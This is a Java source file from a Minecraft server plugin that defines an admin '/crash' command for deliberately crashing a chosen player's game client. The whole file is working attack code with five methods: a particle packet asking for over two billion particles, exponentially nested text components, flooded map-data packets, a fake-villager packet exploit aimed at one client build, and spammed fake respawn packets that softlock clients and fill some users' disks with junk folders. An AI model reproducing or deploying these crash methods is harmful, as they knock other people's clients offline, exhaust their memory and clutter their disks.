package me.totalfreedom.totalfreedommod.cmd;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.PacketEventsAPI;
import com.github.retrooper.packetevents.protocol.player.GameMode;
import com.github.retrooper.packetevents.protocol.player.User;
import com.github.retrooper.packetevents.protocol.world.Difficulty;
import com.github.retrooper.packetevents.protocol.world.dimension.DimensionType;
import com.github.retrooper.packetevents.protocol.world.dimension.DimensionTypes;
import com.github.retrooper.packetevents.wrapper.play.server.*;
import io.github.retrooper.packetevents.util.SpigotConversionUtil;
import me.totalfreedom.totalfreedommod.PluginProvider;
import net.kyori.adventure.bossbar.BossBar;
import net.kyori.adventure.inventory.Book;
import org.bukkit.Bukkit;
import org.bukkit.Particle;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.entity.EntityType;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.minimessage.tag.resolver.Placeholder;

import me.totalfreedom.totalfreedommod.cmd.internal.annotation.*;

import java.util.*;
import java.util.function.Consumer;

@Command(name = "crash", description = "Crashes the specified player", usage = "/crash <player> [method]", aliases = {"fuckup"})
@Permission(permission = "tfm.admin.fuckup")
public class Command_crash extends FCommand
{
    private static final Random RANDOM = new Random();

    @Callback
    public void crash(final CommandSender sender, final Player player)
    {
        if (isProtectedAdmin(sender, player))
        {
            return;
        }

        for (CrashMethod method : CrashMethod.values())
        {
            method.performOperationIfAllowed(player);
        }

        msg(sender, "<gray>Crashed <player>.",
                Placeholder.unparsed("player", player.getName()));
    }

    @Callback
    public void crashUsingSpecificMethods(final CommandSender sender, final Player player, final CrashMethod method)
    {
        if (isProtectedAdmin(sender, player))
        {
            return;
        }

        msg(sender, method.performOperationIfAllowed(player) ?
                "<gray>Crashed <player> using method <method>." :
                "<red>Method <method> has a set of requirements which aren't currently met.",
                Placeholder.unparsed("player", player.getName()),
                Placeholder.unparsed("method", method.name()));
    }

    /**
     * Houses known methods that can be used to crash players. Execution order when using <code>/crash <player></code>
     *  (meaning using all methods) is determined by the order in which the enum entries are defined here.
     */
    public enum CrashMethod
    {
        /**
         * Sends a particle packet to the player instructing their client to show a little more than 2 billion particles
         *  at once, instantly causing their client to either lock up or run out of memory.
         */
        PARTICLES(player ->
                player.spawnParticle(Particle.ASH,
                        player.getLocation(),
                        Integer.MAX_VALUE,
                        0.0,
                        0.0,
                        0.0,
                        1.0,
                        null,
                        true
                )),
        /**
         * Translatable text components can become exponentially large when "visited" by the client, causing most
         *  clients to completely hang or in a worst case scenario run out of memory.
         */
        DECIMATOR(player ->
        {
            // Prepare the second approach to crashing their client in case they have particles disabled
            Component c = Component.text("GET ABSOLUTELY FUCKED!");
            for (int i = 0; i < 50; ++i)
                c = Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s", c);

            // Hit their action bar with this
            player.sendActionBar(c);
            // Send it as a boss bar if they have action bars blocked
            player.showBossBar(BossBar.bossBar(c, 0.69F, BossBar.Color.RED, BossBar.Overlay.PROGRESS));
            // Okay, fine, we'll just throw the book at them
            player.openBook(Book.book(c, c, c));
        }),
        /**
         * The client temporarily stores map data persistently while you are connected to a server. If you flood the
         *  client with a ton of map data packets per second, it causes the client to rapidly eat through its memory
         *  trying to store it all.
         */
        SILENT_BUT_DEADLY(player ->
        {
            final PacketEventsAPI<?> api = PacketEvents.getAPI();
            final User user = api.getPlayerManager().getUser(player);

            WrapperPlayServerMapData packet = new WrapperPlayServerMapData(RANDOM.nextInt(), (byte) 0, null);
            Bukkit.getScheduler().runTaskTimerAsynchronously(PluginProvider.get(), task ->
            {
                // Stop this task if the player has logged off
                if (!player.isOnline() || user == null)
                {
                    task.cancel();
                    return;
                }

                for (int i = 0; i < 1_536; i++)
                {
                    user.sendPacket(packet);
                    packet.setMapId(RANDOM.nextInt());
                }
            }, 0, 1L);
        }),
        /**
         * Meteor Client 0.5.4 includes a version of MixinExtras by default which for some reason introduces
         *  compatibility issues in the Fabric API when using a newer loader version. This exploits that to
         *  intentionally crash players using such a configuration.
         */
        METEOR_VILLAGER_CRASH(player ->
        {
            final PacketEventsAPI<?> api = PacketEvents.getAPI();
            final User user = api.getPlayerManager().getUser(player);

            final int id = RANDOM.nextInt();

            // Send a fake villager to the player via packets
            user.sendPacket(new WrapperPlayServerSpawnEntity(id,
                    UUID.randomUUID(),
                    SpigotConversionUtil.fromBukkitEntityType(EntityType.VILLAGER),
                    SpigotConversionUtil.fromBukkitLocation(player.getLocation()),
                    0F,
                    0,
                    null));

            // Kill the villager, triggering the crash
            user.sendPacket(new WrapperPlayServerEntityStatus(id, 3));
        }, "packetevents"),
        /**
         * <p>The client can get softlocked by spamming it with fictitious "respawn" packets containing fake dimensions.
         *  Since this packet is used when sending players to other worlds and even when moving from server to server in
         *  a proxy, blocking it would case even more issues later down the line.</p>
         *
         * <p>Users running Baritone will also be unfortunate enough to have their disk absolutely annihilated with
         *  folders containing these fictitious world names and for some reason the client will seemingly generate a
         *  MASSIVE amount of virtual threads in the process. This for some reason causes the client to temporarily hang
         *  when joining servers even after disconnecting from the server.</p>
         */
        WORLDLOCK(player ->
        {
            final PacketEventsAPI<?> api = PacketEvents.getAPI();
            final User user = api.getPlayerManager().getUser(player);

            final DimensionType[] types = DimensionTypes.getRegistry().getEntries().toArray(new DimensionType[0]);

            long startTime = System.currentTimeMillis();

            Bukkit.getScheduler().runTaskTimer(PluginProvider.get(), task ->
            {
                // Stop this task if the player has logged off
                if (!player.isOnline() || user == null)
                {
                    task.cancel();
                    return;
                }

                // Perform the following 4 times...
                for (int i = 0; i < 4; i++)
                {
                    // Generate a random dimension name
                    final String randomName = RANDOM.ints(97, 122)
                            .limit(RANDOM.nextInt(1, 16))
                            .collect(StringBuilder::new, StringBuilder::appendCodePoint, StringBuilder::append)
                            .toString();

                    // Avoid spamming the logs with "moved too quickly" messages
                    player.teleportAsync(player.getLocation().set(0, 60, 0));

                    // Send fictitious respawn packets with random dimensions specified, which cause the client to enter a
                    //  transition period in preparation for a dimension swap... which will never come. This can softlock
                    //  the client or at least make it very difficult to escape.
                    user.sendPacket(new WrapperPlayServerRespawn(types[RANDOM.nextInt(types.length)],
                            randomName,
                            Difficulty.values()[RANDOM.nextInt(Difficulty.values().length)],
                            RANDOM.nextLong(),
                            GameMode.values()[RANDOM.nextInt(GameMode.values().length)],
                            GameMode.values()[RANDOM.nextInt(GameMode.values().length)],
                            true,
                            true,
                            (byte) 0x69,
                            null,
                            0,
                            69));
                }

                // Kill the connection after 120 seconds - some older patched clients are prone to flashing lights and
                //  that may cause people genuine harm.
                if (System.currentTimeMillis() - startTime >= 120_000)
                {
                    user.closeConnection();
                }
            }, 0L, 1L);
        }, "packetevents");

        final Consumer<Player> action;
        final List<Boolean> requirements;

        CrashMethod(final Consumer<Player> action)
        {
            this.action = action;
            this.requirements = Collections.emptyList();
        }

        CrashMethod(final Consumer<Player> action, final String... requiredPlugins)
        {
            this.action = action;
            this.requirements = Arrays.stream(requiredPlugins).map(plugin ->
                    Bukkit.getPluginManager().isPluginEnabled(plugin)).toList();
        }

        CrashMethod(final Consumer<Player> action, final Boolean... requirements)
        {
            this.action = action;
            this.requirements = Arrays.stream(requirements).toList();
        }

        public boolean performOperationIfAllowed(final Player player)
        {
            if (requirements.isEmpty() || requirements.stream().allMatch(value -> value == true))
            {
                action.accept(player);
                return true;
            }

            return false;
        }
    }
}